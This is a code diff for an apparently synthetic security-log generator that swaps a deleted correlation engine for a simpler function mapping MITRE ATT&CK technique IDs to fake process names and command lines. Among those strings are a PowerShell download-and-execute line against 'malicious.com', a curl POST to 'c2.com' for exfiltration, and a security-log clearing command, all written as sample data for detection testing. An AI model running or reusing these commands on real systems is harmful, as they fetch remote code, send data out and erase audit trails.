@@ -2,8 +2,7 @@ import {
   AttackSimulationEngine,
   AttackSimulation,
 } from './attack_simulation_engine';
-import { LogCorrelationEngine } from './log_correlation_engine';
-import { CorrelatedAlertGenerator } from './correlated_alert_generator';
+// Removed dependencies on deleted services - using simplified implementations
 import { faker } from '@faker-js/faker';
 import type { TimestampConfig } from '../utils/timestamp_utils';
 import {
@@ -95,8 +94,7 @@ export interface InvestigationStep {
  */
 export class RealisticAttackEngine {
   private attackEngine: AttackSimulationEngine;
-  private correlationEngine: LogCorrelationEngine;
-  private alertGenerator: CorrelatedAlertGenerator;
+  // Removed correlation engine dependencies - using simplified implementations
 
   constructor() {
     this.attackEngine = new AttackSimulationEngine({
@@ -104,8 +102,7 @@ export class RealisticAttackEngine {
       enableCorrelation: true,
       enablePerformanceOptimization: true,
     });
-    this.correlationEngine = new LogCorrelationEngine();
-    this.alertGenerator = new CorrelatedAlertGenerator();
+    // Simplified implementations without deleted dependencies
   }
 
   /**
@@ -197,19 +194,16 @@ export class RealisticAttackEngine {
             'kibana.alert.uuid': faker.string.uuid(),
           } as any;
 
-          // Generate correlated logs for this technique
-          const techniqueeLogs =
-            await this.correlationEngine.generateCorrelatedLogs(mockAlert, {
-              hostName: hostName,
-              userName: userName,
-              timestampConfig: {
-                startDate: stage.start_time.toISOString(),
-                endDate: stage.end_time.toISOString(),
-                pattern: 'attack_simulation',
-              },
-              logCount: config.logsPerStage,
-              multiFieldConfig: config.multiFieldConfig,
-            });
+          // Generate simplified logs for this technique (replacing deleted correlation engine)
+          const techniqueeLogs = await this.generateSimplifiedLogs({
+            hostName: hostName,
+            userName: userName,
+            technique: technique,
+            startTime: stage.start_time,
+            endTime: stage.end_time,
+            logCount: config.logsPerStage,
+            multiFieldConfig: config.multiFieldConfig,
+          });
 
           logs.push(...techniqueeLogs);
         } catch (error: any) {
@@ -464,6 +458,104 @@ export class RealisticAttackEngine {
       T1041: 'Detects data exfiltration over command and control channels.',
     };
     return descriptions[technique] || `Detects suspicious activity related to ${technique}`;
+  }
+
+  /**
+   * Generate simplified logs for a technique (replacement for deleted correlation engine)
+   */
+  private async generateSimplifiedLogs(params: {
+    hostName: string;
+    userName: string;
+    technique: string;
+    startTime: Date;
+    endTime: Date;
+    logCount: number;
+    multiFieldConfig?: any;
+  }): Promise<any[]> {
+    const logs: any[] = [];
+    const { hostName, userName, technique, startTime, endTime, logCount } = params;
+    
+    // Generate basic logs for the technique
+    for (let i = 0; i < logCount; i++) {
+      const timestamp = new Date(startTime.getTime() + (i * ((endTime.getTime() - startTime.getTime()) / logCount)));
+      
+      const log = {
+        '@timestamp': timestamp.toISOString(),
+        'host.name': hostName,
+        'user.name': userName,
+        'event.action': this.getTechniqueAction(technique),
+        'event.category': ['security'],
+        'event.type': ['info'],
+        'event.dataset': 'security',
+        'data_stream.dataset': 'logs-endpoint.events.process-default',
+        'threat.technique.id': technique,
+        'message': `Simulated activity for ${technique}`,
+        'process.name': this.getTechniqueProcess(technique),
+        'process.pid': faker.number.int({ min: 1000, max: 9999 }),
+        'process.command_line': this.getTechniqueCommandLine(technique),
+      };
+      
+      logs.push(log);
+    }
+    
+    return logs;
+  }
+
+  /**
+   * Get typical action for a MITRE technique
+   */
+  private getTechniqueAction(technique: string): string {
+    const actions: Record<string, string> = {
+      T1566: 'email-attachment-opened',
+      T1059: 'script-execution',
+      T1055: 'process-injection',
+      T1003: 'credential-dumping',
+      T1070: 'file-deletion',
+      T1083: 'file-discovery',
+      T1190: 'exploit-attempt',
+      T1195: 'supply-chain-compromise',
+      T1486: 'file-encryption',
+      T1041: 'data-exfiltration',
+    };
+    return actions[technique] || 'suspicious-activity';
+  }
+
+  /**
+   * Get typical process for a MITRE technique
+   */
+  private getTechniqueProcess(technique: string): string {
+    const processes: Record<string, string> = {
+      T1566: 'outlook.exe',
+      T1059: 'powershell.exe',
+      T1055: 'svchost.exe',
+      T1003: 'lsass.exe',
+      T1070: 'wevtutil.exe',
+      T1083: 'dir.exe',
+      T1190: 'w3wp.exe',
+      T1195: 'msiexec.exe',
+      T1486: 'ransomware.exe',
+      T1041: 'curl.exe',
+    };
+    return processes[technique] || 'unknown.exe';
+  }
+
+  /**
+   * Get typical command line for a MITRE technique
+   */
+  private getTechniqueCommandLine(technique: string): string {
+    const commands: Record<string, string> = {
+      T1566: 'outlook.exe /safe',
+      T1059: 'powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.com/script.ps1\')"',
+      T1055: 'svchost.exe -k netsvcs',
+      T1003: 'lsass.exe',
+      T1070: 'wevtutil.exe clear-log Security',
+      T1083: 'dir C:\\ /s',
+      T1190: 'w3wp.exe',
+      T1195: 'msiexec.exe /i malicious.msi',
+      T1486: 'ransomware.exe --encrypt C:\\',
+      T1041: 'curl.exe -X POST http://c2.com/data',
+    };
+    return commands[technique] || 'unknown.exe';
   }
 
   /**
